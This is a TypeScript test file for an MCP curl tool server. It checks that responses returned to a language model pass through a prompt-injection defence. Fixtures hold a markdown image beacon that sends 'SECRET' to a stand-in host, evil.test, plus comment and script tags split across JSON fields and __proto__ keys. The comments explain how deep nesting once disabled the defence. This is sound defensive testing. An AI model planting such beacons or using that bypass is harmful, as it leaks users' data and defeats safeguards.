// src/lib/tools/register-all-tools.test.ts
// Guards the SHIPPED BINARY's registration path — `src/index.ts` →
// `runStdio()`/`runHTTP()` → `registerAllCapabilities()` → `registerAllTools`.
//
// This path had no test at all, which is why `docs/todos/006` was possible:
// every wrap assertion in the tree ran against `McpCurlServer` or
// `tool-wrapper.ts` directly, so the whole suite stayed green while the one
// entry point `curl-mcp` exposes returned unwrapped output. A correct wrap that
// a registration path never calls is indistinguishable, from a unit test's
// point of view, from no wrap at all.
//
// The subprocess is the only thing mocked. Everything above it — the real
// executor, `processResponse`, `defendText`, the post-processor wrap — runs, so
// these assert the composition rather than any one stage's contract.

import { describe, it, expect, vi, beforeEach, afterEach, type Mock } from "vitest";
import { mkdtemp, writeFile, rm } from "node:fs/promises";
import { join } from "node:path";
import { CurlExecuteSchema, JqQuerySchema } from "../server/schemas.js";
import { DEFAULT_USER_AGENT } from "../config/index.js";
import { clearInjectionDetectionMap } from "../security/detection-logger.js";

// The real separator length, not a short stand-in: the metadata search window
// is sized from it, so a shorter mock hides margin the production path lacks.
const SEP = "\n---MCP-CURL-00000000-0000-4000-8000-000000000000---\n";

vi.mock("../types/index.js", async () => {
    const actual = await vi.importActual<typeof import("../types/index.js")>("../types/index.js");
    return { ...actual, generateMetadataSeparator: () => SEP };
});

vi.mock("../security/index.js", async () => {
    const actual = await vi.importActual<typeof import("../security/index.js")>("../security/index.js");
    return {
        ...actual,
        validateUrlAndResolveDns: vi.fn().mockResolvedValue({
            hostname: "api.example.test",
            resolvedIp: "93.184.216.34",
            port: 443,
        }),
        checkRateLimits: vi.fn(),
    };
});

vi.mock("../execution/index.js", async () => {
    const actual = await vi.importActual<typeof import("../execution/index.js")>("../execution/index.js");
    return { ...actual, executeCommand: vi.fn() };
});

const executionModule = await import("../execution/index.js");
const { registerAllCapabilities } = await import("../server/registration.js");

const mockedExecuteCommand = executionModule.executeCommand as Mock;

/**
 * Build cURL output as the real executor hands it back.
 *
 * `headerBlock` is the response-header descriptor's content. It is a separate
 * argument rather than part of `body` because the two travel on separate
 * descriptors in production (invariant 13) — a test that concatenated them
 * would be asserting against a composition the executor never produces.
 */
function curlOutput(body: string, contentType: string, headerBlock?: string) {
    return {
        stdoutBytes: Buffer.concat([
            Buffer.from(body, "utf8"),
            Buffer.from(`${SEP}${contentType}`, "utf8"),
        ]),
        headerBytes: headerBlock === undefined ? undefined : Buffer.from(headerBlock, "utf8"),
        headerBytesReceived:
            headerBlock === undefined ? undefined : Buffer.byteLength(headerBlock, "utf8"),
        stderr: "",
        exitCode: 0,
    };
}

/** A minimal response-header block, as cURL dumps it. */
const HEADER_BLOCK = "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\n\r\n";

/** Pull the JSON body out of a plain-branch response that carries a header prefix. */
function bodyAfterHeaders(text: string): unknown {
    const match = text.match(/\{[\s\S]*\}/);
    if (match === null) throw new Error(`no JSON body in response: ${text}`);
    return JSON.parse(match[0]);
}

/**
 * Register through the shipped chain and hand back the captured handlers.
 *
 * `registerAllCapabilities` rather than `registerAllTools`, because the claim
 * being guarded is about what `runStdio()` builds — and the extra hop is where
 * a future edit would most plausibly reintroduce a bare registration.
 */
function registerViaShippedPath() {
    const handlers = new Map<string, (...args: unknown[]) => Promise<unknown>>();
    const fakeServer = {
        registerTool: (
            name: string,
            _meta: unknown,
            handler: (...args: unknown[]) => Promise<unknown>
        ) => {
            handlers.set(name, handler);
        },
        registerResource: vi.fn(),
        registerPrompt: vi.fn(),
    };
    registerAllCapabilities(fakeServer as never);
    return handlers;
}

/** Parse through the real schema so tests exercise the true input shape. */
const params = (p: Record<string, unknown>) =>
    CurlExecuteSchema.parse({ url: "https://api.example.test/v1/thing", ...p });

/** Read a flag's value out of the argv the executor built. */
function flagValue(args: readonly string[], flag: string): string | undefined {
    const i = args.indexOf(flag);
    return i === -1 ? undefined : args[i + 1];
}

const textOf = (result: unknown) => (result as { content: { text: string }[] }).content[0].text;

beforeEach(() => {
    clearInjectionDetectionMap();
    vi.clearAllMocks();
});

// Teardown at describe scope, not in the test bodies. An in-body
// `vi.unstubAllEnvs()` never runs when an assertion above it throws, so one real
// failure leaks `MCP_CURL_USER_AGENT` into every test after it and turns a
// single fault into a cascade of misleading ones. Every other env-touching suite
// in this repo does it here — `config/defaults.test.ts`,
// `extensible/tool-wrapper.test.ts`.
afterEach(() => {
    vi.unstubAllEnvs();
});

describe("registerAllTools — the shipped binary's registration path", () => {
    it("registers both tools", () => {
        const handlers = registerViaShippedPath();
        expect([...handlers.keys()].sort()).toEqual(["curl_execute", "jq_query"]);
    });

    // ---------------------------------------------------------------------
    // Invariant 1: every byte returned to the LLM passes through the wrap.
    //
    // `application/json` is the content type that makes this falsifiable.
    // Under invariant 1a the PERSISTED copy keeps the JSON-document exemption
    // (RC-8/RC-10), so `defendText` leaves the beacon alone on the way to
    // disk. The wrap passes `excludeJsonDocuments: false`, so the RETURNED
    // copy must be stripped. Without the wrap the two copies are identical
    // and the beacon reaches the model verbatim — which is exactly what the
    // shipped binary did.
    // ---------------------------------------------------------------------
    it("strips a markdown beacon from an application/json body before returning it", async () => {
        mockedExecuteCommand.mockResolvedValue(
            curlOutput('{"note":"![x](https://evil.test/?d=SECRET)"}', "application/json")
        );

        const handlers = registerViaShippedPath();
        const text = textOf(await handlers.get("curl_execute")!(params({}), { sessionId: undefined }));

        expect(text).toContain("[image removed]");
        expect(text).not.toContain("evil.test");
        expect(text).not.toContain("SECRET");
    });

    // ---------------------------------------------------------------------
    // `README.md` documents MCP_CURL_USER_AGENT and MCP_CURL_REFERER as the
    // default "for every request". `applyDefaultHeaders` is their only reader
    // and it sits on the registration path, so before this fix the shipped
    // binary ignored both env vars entirely while the library honoured them.
    //
    // Asserted on the argv the executor actually built, not on the transform
    // in isolation: the transform was always correct: nothing called it.
    // ---------------------------------------------------------------------
    it("honours MCP_CURL_USER_AGENT on the shipped path", async () => {
        vi.stubEnv("MCP_CURL_USER_AGENT", "sixees-orchestrator/1.0");
        mockedExecuteCommand.mockResolvedValue(curlOutput("{}", "application/json"));

        const handlers = registerViaShippedPath();
        await handlers.get("curl_execute")!(params({}), { sessionId: undefined });

        const args = mockedExecuteCommand.mock.calls[0][1] as string[];
        expect(flagValue(args, "-A")).toBe("sixees-orchestrator/1.0");
    });

    it("identifies itself with the default User-Agent when no env override is set", async () => {
        vi.stubEnv("MCP_CURL_USER_AGENT", undefined);
        mockedExecuteCommand.mockResolvedValue(curlOutput("{}", "application/json"));

        const handlers = registerViaShippedPath();
        await handlers.get("curl_execute")!(params({}), { sessionId: undefined });

        const args = mockedExecuteCommand.mock.calls[0][1] as string[];
        expect(flagValue(args, "-A")).toBe(DEFAULT_USER_AGENT);
        expect(flagValue(args, "-A")).toContain("mcp-curl/");
    });

    // A caller-supplied user_agent still wins — the defaults fill a gap, they
    // do not override an explicit choice.
    it("does not override an explicit user_agent", async () => {
        vi.stubEnv("MCP_CURL_USER_AGENT", "sixees-orchestrator/1.0");
        mockedExecuteCommand.mockResolvedValue(curlOutput("{}", "application/json"));

        const handlers = registerViaShippedPath();
        await handlers.get("curl_execute")!(
            params({ user_agent: "explicit/9.9" }),
            { sessionId: undefined }
        );

        const args = mockedExecuteCommand.mock.calls[0][1] as string[];
        expect(flagValue(args, "-A")).toBe("explicit/9.9");
    });

    // ---------------------------------------------------------------------
    // The wrap must survive remote-chosen nesting depth.
    //
    // Measured before the depth bound existed: a 4,035-byte body overflowed
    // the stack inside `defendJsonLeaves`, `createWrapper`'s catch logged the
    // `RangeError` and returned the UNTOUCHED result still tagged as wrapped,
    // so the beacon reached the model and any downstream wrap short-circuited
    // too. A remote could switch the whole defence off with 4 KB.
    //
    // Depth is the axis, so the cases are a ladder rather than one payload:
    // a single depth exercises a single bound, and the two generations of
    // guard this file's own header describes both passed against the one
    // payload they carried.
    // ---------------------------------------------------------------------
    describe("depth cannot switch the defence off", () => {
        const nested = (depth: number) =>
            "[".repeat(depth) +
            JSON.stringify("![x](https://evil.test/?d=SECRET)") +
            "]".repeat(depth);

        for (const depth of [1, 50, 99, 100, 101, 500, 2000, 10000]) {
            it(`strips the beacon at nesting depth ${depth}`, async () => {
                mockedExecuteCommand.mockResolvedValue(
                    curlOutput(nested(depth), "application/json")
                );
                const handlers = registerViaShippedPath();
                const text = textOf(
                    await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
                );

                expect(text).not.toContain("evil.test");
                expect(text).not.toContain("SECRET");
            });
        }
    });

    // ---------------------------------------------------------------------
    // Invariant 16 one nesting level down: the defence must not delete a
    // field. RC-16 closed this at the envelope; a string leaf that is itself
    // a serialised document is the next level, and it was open.
    //
    // The assertion is "are all the parts still there", not "does the result
    // parse" — RC-16's own closing lesson. A spliced document parses fine,
    // which is exactly why nothing downstream detected it.
    // ---------------------------------------------------------------------
    describe("the defence never deletes a field", () => {
        it("keeps every key when tokens pair across fields, under include_metadata", async () => {
            const body = '{"a":"open <!--","b":"secret","c":"close -->","d":"kept"}';
            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("curl_execute")!(
                    params({ include_metadata: true }),
                    { sessionId: undefined }
                )
            );

            const returned = JSON.parse(JSON.parse(text).response);
            expect(Object.keys(returned)).toEqual(["a", "b", "c", "d"]);
        });

        it("keeps every key for a script pair split across fields", async () => {
            const body = '{"a":"<script>","b":"secret","c":"</script>","d":"kept"}';
            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("curl_execute")!(
                    params({ include_metadata: true }),
                    { sessionId: undefined }
                )
            );

            const returned = JSON.parse(JSON.parse(text).response);
            expect(Object.keys(returned)).toEqual(["a", "b", "c", "d"]);
        });

        // Positive control for the composites-only rule in `defendJsonLeaves`.
        // `JSON_DOCUMENT_FIRST_CHARS` admits digits and `-`, so a scalar leaf
        // parses as JSON too — and recursing into one would re-serialise it,
        // turning the string "1.50" into "1.5" and "007" into "7". A scalar
        // has no fields and cannot be spliced, so this arm must leave it
        // exactly as the origin sent it.
        it("does not rewrite scalar-shaped string values", async () => {
            const body = '{"version":"1.50","id":"007","flag":"true","neg":"-0.0"}';
            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
            );

            expect(JSON.parse(text)).toEqual({
                version: "1.50",
                id: "007",
                flag: "true",
                neg: "-0.0",
            });
        });

        // ---------------------------------------------------------------
        // The `include_headers` arm. `formatResponse` prefixes the header
        // block to the body on the plain branch, so the composed string does
        // not parse as JSON and the wrap's UNDIVIDED arm ran over it — pairing
        // a marker in one body field with one in a later field and deleting
        // what lay between. Routing the binary through the wrap is what
        // exposed this: measured `["a","d"]` here against `["a","b","c","d"]`
        // on the pre-wrap registration, so it was a regression of this
        // branch's own making rather than the pre-existing defect
        // `docs/todos/012` described. The body is now defended as its own
        // region before composition.
        //
        // These assert on the SHIPPED path rather than on `defendForInline`
        // directly, because the defect lived in the composition and a direct
        // assertion on the defence never sees it.
        // ---------------------------------------------------------------
        it("keeps every key when a header block is prefixed to the body", async () => {
            const body = '{"a":"open <!--","b":"secret","c":"close -->","d":"kept"}';
            mockedExecuteCommand.mockResolvedValue(
                curlOutput(body, "application/json", HEADER_BLOCK)
            );

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("curl_execute")!(
                    params({ include_headers: true, include_metadata: false }),
                    { sessionId: undefined }
                )
            );

            expect(Object.keys(bodyAfterHeaders(text) as object)).toEqual(["a", "b", "c", "d"]);
        });

        it("keeps every key for a script pair behind a header block", async () => {
            const body = '{"a":"<script>","b":"secret","c":"</script>","d":"kept"}';
            mockedExecuteCommand.mockResolvedValue(
                curlOutput(body, "application/json", HEADER_BLOCK)
            );

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("curl_execute")!(
                    params({ include_headers: true, include_metadata: false }),
                    { sessionId: undefined }
                )
            );

            expect(Object.keys(bodyAfterHeaders(text) as object)).toEqual(["a", "b", "c", "d"]);
        });

        it("keeps every key for a style pair behind a header block", async () => {
            const body = '{"a":"<style>","b":"secret","c":"</style>","d":"kept"}';
            mockedExecuteCommand.mockResolvedValue(
                curlOutput(body, "application/json", HEADER_BLOCK)
            );

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("curl_execute")!(
                    params({ include_headers: true, include_metadata: false }),
                    { sessionId: undefined }
                )
            );

            expect(Object.keys(bodyAfterHeaders(text) as object)).toEqual(["a", "b", "c", "d"]);
        });

        // The fix must WIDEN the defence over this arm, not exempt the channel.
        // Without this, defending the body early and then skipping the wrap
        // would pass every assertion above while letting a beacon through.
        it("still strips a beacon on the header-prefixed arm", async () => {
            const body = '{"n":"![x](https://evil.test/?d=SECRET)"}';
            mockedExecuteCommand.mockResolvedValue(
                curlOutput(body, "application/json", HEADER_BLOCK)
            );

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("curl_execute")!(
                    params({ include_headers: true, include_metadata: false }),
                    { sessionId: undefined }
                )
            );

            expect(text).toContain("[image removed]");
            expect(text).not.toContain("evil.test");
        });

        // Positive control: the header region is defended by
        // `extractHeaderChannel` before assembly, so an unpaired opener in
        // header text has nothing to pair WITH in the body. If a future edit
        // stops stripping the header region, this catches it — the body's
        // first line would be consumed.
        it("does not let an unpaired opener in header text eat the body", async () => {
            const body = '{"first":"kept","second":"also kept"}';
            mockedExecuteCommand.mockResolvedValue(
                curlOutput(
                    body,
                    "application/json",
                    "HTTP/1.1 200 OK\r\nx-trace: a<!--b\r\n\r\n"
                )
            );

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("curl_execute")!(
                    params({ include_headers: true, include_metadata: false }),
                    { sessionId: undefined }
                )
            );

            expect(Object.keys(bodyAfterHeaders(text) as object)).toEqual(["first", "second"]);
        });

        // ---------------------------------------------------------------
        // A remote picks these keys, and `__proto__` is the one that is not a
        // key at all on a `{}` accumulator — assignment reaches
        // `Object.prototype`'s inherited setter, the field never becomes an own
        // property, and `JSON.stringify` omits it. Measured before the fix:
        // two fields in, one out, silently, leaving valid JSON.
        // ---------------------------------------------------------------
        it("keeps a __proto__ field the origin sent", async () => {
            const body = '{"__proto__":{"value":"kept"},"ok":"also kept"}';
            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
            );

            const returned = JSON.parse(text) as Record<string, unknown>;
            expect(Object.keys(returned)).toEqual(["__proto__", "ok"]);
            expect(returned["ok"]).toBe("also kept");
        });

        it("keeps a __proto__ field inside a nested document leaf", async () => {
            // Written as literal JSON, never via an object literal: a
            // `__proto__:` key in JS source sets the prototype instead of
            // creating an own property, so `JSON.stringify` would emit a
            // fixture with the field already missing and the test would pass
            // against the unfixed code.
            const nested = '{"__proto__":{"v":"kept"},"ok":"also kept"}';
            mockedExecuteCommand.mockResolvedValue(
                curlOutput(JSON.stringify({ outer: nested }), "application/json")
            );

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
            );

            const outer = (JSON.parse(text) as { outer: string }).outer;
            expect(Object.keys(JSON.parse(outer) as object)).toEqual(["__proto__", "ok"]);
        });
    });

    // ---------------------------------------------------------------------
    // The mirror of the `curl_execute` wrap assertion above. Without this,
    // reverting the `registerJqToolWithHooks` call to a bare `registerTool`
    // passes the whole suite — which is the condition that let `docs/todos/006`
    // exist in the first place, recreated on the sibling tool by the guard
    // meant to close it. The assertion set must match the registration set.
    // ---------------------------------------------------------------------
    describe("jq_query takes the same wrap", () => {
        let dir: string;

        beforeEach(async () => {
            // Under cwd, which `validateFilePath` permits, so the real path
            // validation runs rather than being mocked away.
            dir = await mkdtemp(join(process.cwd(), ".tmp-register-all-tools-"));
        });

        afterEach(async () => {
            await rm(dir, { recursive: true, force: true });
        });

        it("strips a markdown beacon from a queried JSON file", async () => {
            const file = join(dir, "saved.json");
            await writeFile(file, '{"note":"![x](https://evil.test/?d=SECRET)"}', "utf-8");

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("jq_query")!(
                    JqQuerySchema.parse({ filepath: file, jq_filter: ".note" }),
                    { sessionId: undefined }
                )
            );

            expect(text).toContain("[image removed]");
            expect(text).not.toContain("evil.test");
            expect(text).not.toContain("SECRET");
        });

        // Settles the instance `docs/todos/012` recorded as SUSPECTED rather
        // than confirmed: jq output is a document whose leaves can themselves
        // be documents, so the splice class had a candidate here that nobody
        // had executed. It does not apply — `executeJqQuery` returns one
        // string with nothing prefixed to it, so the composed-string arm
        // cannot be reached, and both shapes jq can emit take the region-wise
        // path. Asserted rather than argued, because "no composition here" is
        // a claim about code that can change.
        it("keeps every key when the filter returns a whole document", async () => {
            const file = join(dir, "doc.json");
            await writeFile(
                file,
                '{"outer":{"a":"open <!--","b":"secret","c":"close -->","d":"kept"}}',
                "utf-8"
            );

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("jq_query")!(
                    JqQuerySchema.parse({ filepath: file, jq_filter: ".outer" }),
                    { sessionId: undefined }
                )
            );

            expect(Object.keys(JSON.parse(text) as object)).toEqual(["a", "b", "c", "d"]);
        });

        it("keeps every key when the filter returns a document as a string leaf", async () => {
            const file = join(dir, "leaf.json");
            const nested = '{"a":"open <!--","b":"secret","c":"close -->","d":"kept"}';
            await writeFile(file, JSON.stringify({ note: nested }), "utf-8");

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("jq_query")!(
                    JqQuerySchema.parse({ filepath: file, jq_filter: ".note" }),
                    { sessionId: undefined }
                )
            );

            // The filter yields a JSON string whose content is a document; the
            // wrap's string-leaf arm is what has to divide it.
            expect(Object.keys(JSON.parse(JSON.parse(text) as string) as object)).toEqual([
                "a",
                "b",
                "c",
                "d",
            ]);
        });
    });
});
